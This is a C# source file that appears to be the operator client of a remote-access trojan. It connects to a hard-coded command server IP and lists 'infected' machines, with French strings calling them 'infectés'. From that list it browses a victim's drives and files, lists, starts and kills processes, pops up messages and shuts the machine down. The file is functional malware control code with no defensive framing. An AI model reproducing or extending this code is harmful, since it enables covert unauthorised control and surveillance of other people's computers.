using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using YTAH_COMMUNITY.IO;

namespace YTAH_COMMUNITY
{

   public class Network
    {
        public static NetworkStream ns;
        public static TcpClient client;
        public static IPAddress ip = IPAddress.Parse("78.114.52.238");
        public static int port = 5000;
        
        public static void Connect()
        {
            try
            {
                client = new TcpClient();
                client.Connect(ip, port);
                Thread thread = new Thread(o => ReceiveData((TcpClient)o));
                thread.IsBackground = true;
                thread.Start(client);              
                    Form1.current = Form1.State.CONNECTE;
                

            }
            catch
            {
                Form1.current = Form1.State.DECONNECTE;
            }
        }
        public static void GetUsers()
        {
            string msg = "GetUsers|" + Perso.Me.username;
            SendMessage(msg);
        }
        public static void SelectUser(string userpost)
        {
            byte[] b = Encoding.UTF8.GetBytes("SelectUser|" + Perso.Me.username + "|" + userpost);
            ns.Write(b, 0, b.Length);
        }
        
        public static void SendMessage(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                ns.Write(b, 0, b.Length);
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        static string commandStart = "SC;" + Perso.Me.username + ";";
        public static void SendEnable()
        {
            SendMessage(commandStart + "enable");
        }
        public static void SendDisable()
        {
            SendMessage(commandStart + "disable");
        }
        public static void RefreshVar()
        {
            commandStart = "SC;" + Perso.Me.username + ";";
        }
        public static void GetDrives()
        {
            byte[] b = Encoding.UTF8.GetBytes("GetDrives|" + Perso.Me.username + "|" + Perso.Me.selected_user.username);
            ns.Write(b, 0, b.Length);
        }
        public static void ChangePath(string newPath)
        {
            byte[] b = Encoding.UTF8.GetBytes(commandStart + "mt|" + Perso.Me.username + "|" + newPath);
            ns.Write(b, 0, b.Length);
        }

        public static void ListProcess()
        {
            byte[] b = Encoding.UTF8.GetBytes(commandStart + "LP|" + Perso.Me.username);
            ns.Write(b, 0, b.Length);
        }

        public static void SendPopUp(string content)
        {
            byte[] b = Encoding.UTF8.GetBytes(commandStart + "sm|" + content);
            ns.Write(b, 0, b.Length);
        }
        public static void ShutDown()
        {
            byte[] b = Encoding.UTF8.GetBytes(commandStart + "shut");
            ns.Write(b, 0, b.Length);
        }
        public static void StartProcess(string processname)
        {
            byte[] b = Encoding.UTF8.GetBytes(commandStart + "SP|" + processname);
            ns.Write(b, 0, b.Length);
        }
        public static void KillProcess(string processname)
        {
            byte[] b = Encoding.UTF8.GetBytes(commandStart + "KP|" + processname);
            ns.Write(b, 0, b.Length);
        }




        public static void ReceiveData(TcpClient client)
        {
            ns = client.GetStream();
            byte[] receivedBytes = new byte[1024];
            int byte_count;
            try
            {
                while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
                {
                    string d = Encoding.UTF8.GetString(receivedBytes, 0, byte_count);
                   // MessageDisplayer.Log(d);
                    string[] splitter = d.Split('|');
                    if (d.Contains("authsuccess"))
                    {
                        Perso.Me.username = Form1.username;
                        new Thread(() =>
                        {
                            Form2 frm = new Form2();
                            frm.ShowDialog();

                        }).Start();
                        Form1.todo = "d";
                    }
                    if (d.Contains("authfail"))
                    {
                        MessageBox.Show("Tu t'es trompé / tu ne fait pas partit de l'élite, navré poto");
                    }
                    if (d.Contains("LOG"))
                    {
                        string logid = splitter[1];
                        string msg = splitter[2];
                        string secmsg = "";
                        try
                        {
                            secmsg = splitter[3];
                        }
                        catch
                        {

                        }
                        switch (logid)
                        {
                            case "adminconnect":
                                MessageDisplayer.AdminConnect(msg);
                                break;
                            case "SelectSuccess":
                                MessageDisplayer.SelectBool(true, msg, secmsg);
                                break;
                            case "SelectFailed":
                                MessageDisplayer.SelectBool(false, msg, secmsg);
                                MessageBox.Show("L'utilisateur que vous essayez de séléctionner est probablement déconnecté \r\n toute tentative d'envoie de commande sur ce PC sera par conséquent inutile");
                                break;
                            case "ACTIVITY":
                                MessageDisplayer.Log(msg);
                                break;
                        }

                    }
                    if (d.Contains("NewDisk"))
                    {
                        string reqID = splitter[0];
                        string dirName = splitter[1];
                        DiskDirectory dd = new DiskDirectory(dirName);
                        DiskDirectory.diskDirectories.Add(dd);
                       
                    }
                    if (d.Contains("NewFile"))
                    {
                        string reqID = splitter[0];
                        string dirName = splitter[1];
                        CustomThing dd = new CustomThing(dirName);
                        CustomThing.customThings.Add(dd);
                        //MessageDisplayer.Log("New Created file " + CustomThing.customThings.Count.ToString());

                    }
                    if (d.Contains("NewFolder"))
                    {
                        string reqID = splitter[0];
                        string dirName = splitter[1];
                        CustomThing dd = new CustomThing(dirName);
                        CustomThing.customThings.Add(dd);
                        //MessageDisplayer.Log("New Created folder " + CustomThing.customThings.Count.ToString());
                    }
                    if (d.Contains("empty"))
                    {
                        MessageDisplayer.Log("Aucun infecté !");
                    }
                    if (d.Contains("NewProcess"))
                    {
                        string[] split = d.Split('|');
                        string processname = split[1];
                        string processid = split[2];
                        string processTitle = split[3];
                        bool todo = true;
                        CustomProcess cp = new CustomProcess(processname, processid, processTitle);
                        foreach(CustomProcess cps in CustomProcess.customProcesses)
                        {
                            if(cps.processid == processid)
                            {
                                todo = false;
                            }
                        }
                        if(todo == true)
                        {
                            CustomProcess.customProcesses.Add(cp);
                        }
                    }
                    if (d.Contains("USERS"))
                    {
                        User.users.Clear();
                        string[] global =  d.Split(';'); //USERS;dzqd|qdoqzd|zqdpqokz|qzqzdp;
                        string reqid = global[0];
                        //MessageDisplayer.LoadUsers();
                        foreach (string s in global)
                        {
                            if (!s.Contains("USERS"))
                            {
                               
                                if (s == "")
                                {

                                }
                                else
                                {
                                    try
                                    {
                                        string[] split = s.Split('|');
                                        string poste = split[0];
                                        string user = split[1];
                                        string isadmin = split[2];
                                        string ip = split[3];
                                        User u = new User(user, poste, isadmin, ip);
                                        if (!User.users.Contains(u))
                                        {
                                            User.users.Add(u);
                                            MessageDisplayer.UserConnected(user);

                                        }
                                        
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                            
                        }
                       // MessageDisplayer.UsersLoaded();
                    }
                 
                }
            }
            catch
            {
                Form1.current = Form1.State.DECONNECTE;
            }
        
        }

   }
}
